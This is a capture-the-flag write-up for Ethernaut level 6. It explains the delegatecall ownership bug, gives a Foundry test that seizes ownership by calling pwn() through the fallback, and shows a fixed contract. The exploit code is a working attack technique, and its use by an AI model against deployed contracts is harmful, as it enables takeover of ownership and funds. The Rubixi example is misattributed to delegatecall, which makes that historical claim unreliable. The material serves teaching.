# Ethernaut Level 6: Delegation

## Challenge Description
Claim ownership of the Delegate contract below to complete this level.

**Difficulty:** ⭐⭐⭐ (Intermediate)

**Goal:** Become the owner of the Delegate contract.

## Vulnerable Contracts

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The fallback() function uses delegatecall!

Key Concept - delegatecall:
- delegatecall executes code from another contract
- BUT it runs in the context of the CALLING contract
- This means: storage, msg.sender, and msg.value come from the caller

The Attack Vector:
1. Delegation contract has a fallback() that delegatecalls to Delegate
2. Delegate has a pwn() function that sets owner = msg.sender
3. If we call pwn() on Delegation, the fallback triggers
4. fallback() delegatecalls to Delegate.pwn()
5. Delegate.pwn() runs in Delegation's context
6. owner = msg.sender (but msg.sender is NOW our address!)
7. Delegation's owner is changed to us!

Why This Works:
- delegatecall preserves the calling contract's storage
- So when Delegate.pwn() sets owner = msg.sender
- It's actually setting Delegation's owner variable (slot 0)
- Not Delegate's owner variable!
```

## Exploit Strategy

```text
Step 1: Understand the storage layout
   - Delegation.owner is at storage slot 0
   - Delegate.owner is also at storage slot 0
   - When delegatecall runs, it uses Delegation's storage

Step 2: Call the pwn() function on Delegation
   - Delegation doesn't have pwn(), so fallback() is triggered
   - fallback() delegatecalls to Delegate.pwn()
   - Delegate.pwn() executes in Delegation's context
   - owner (slot 0 of Delegation) = msg.sender (our address)

Step 3: Verify ownership changed
   - Delegation.owner is now our address
   - Challenge complete!
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Delegation.sol";

contract DelegationExploitTest is Test {
    Delegate public delegateImpl;
    Delegation public target;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // Deploy the Delegate implementation
        delegateImpl = new Delegate(address(0));

        // Deploy the Delegation proxy pointing to Delegate
        target = new Delegation(address(delegateImpl));

        vm.deal(attacker, 1 ether);
    }

    function test_ExploitDelegation() public {
        console.log("Initial owner:", target.owner());

        vm.startPrank(attacker);

        // Call pwn() on Delegation
        // Delegation doesn't have pwn(), so fallback() is triggered
        // fallback() delegatecalls to Delegate.pwn()
        // This changes Delegation's owner to msg.sender (attacker)
        (bool success, ) = address(target).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Exploit failed");

        vm.stopPrank();

        console.log("New owner:", target.owner());
        assertEq(target.owner(), attacker, "Failed to become owner");

        console.log("\n✅ EXPLOIT SUCCESSFUL!");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitDelegation -vvv

# Expected output:
# [PASS] test_ExploitDelegation() (gas: 78901)
# Logs:
#   Initial owner: 0x5B3...
#   New owner: 0xBEEF...
#
#   ✅ EXPLOIT SUCCESSFUL!
```

## Real-World Impact

```text
delegatecall vulnerabilities are EXTREMELY dangerous!

Famous Examples:
1. Parity Wallet Hack (2017): $150M frozen due to delegatecall bug
2. Rubixi Hack (2016): Attackers changed owner via delegatecall
3. Multiple proxy contract exploits use delegatecall

Why It's Dangerous:
- delegatecall can modify ANY storage variable
- If the called contract has malicious functions, it can drain funds
- Proxy patterns rely on delegatecall, so bugs are catastrophic

The Solution:
- Always validate what functions can be called via delegatecall
- Use OpenZeppelin's proxy implementations (battle-tested)
- Never delegatecall to untrusted contracts
```

## How to Fix This Vulnerability

```solidity
// FIXED VERSION - Use function selector validation
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract DelegationFixed {
    address public owner;
    Delegate delegate;

    // Only allow specific function selectors
    bytes4 constant ALLOWED_SELECTOR = bytes4(keccak256("safeFunction()"));

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        // Only allow specific functions to be delegatecalled
        require(msg.sig == ALLOWED_SELECTOR, "Function not allowed");

        (bool result, ) = address(delegate).delegatecall(msg.data);
        require(result, "Delegatecall failed");
    }
}

// Or better: Use OpenZeppelin's Transparent Proxy or UUPS
// These have built-in protection against unauthorized delegatecalls
```

## Key Takeaways
- **delegatecall Context:** Code runs from implementation, but storage/msg.sender comes from caller.
- **Storage Collision Risk:** delegatecall can modify ANY storage variable in the calling contract.
- **Function Selector Validation:** Always validate which functions can be called via delegatecall.
- **Proxy Pattern Danger:** Proxy contracts use delegatecall, making them high-risk if not implemented correctly.
- **Use OpenZeppelin Proxies:** Never write your own proxy - use battle-tested implementations.
- **Lesson Learned:** delegatecall is powerful but dangerous. Treat it like giving someone full access to your contract's storage.
- **Historical Context:** delegatecall bugs have caused some of the largest hacks in Ethereum history.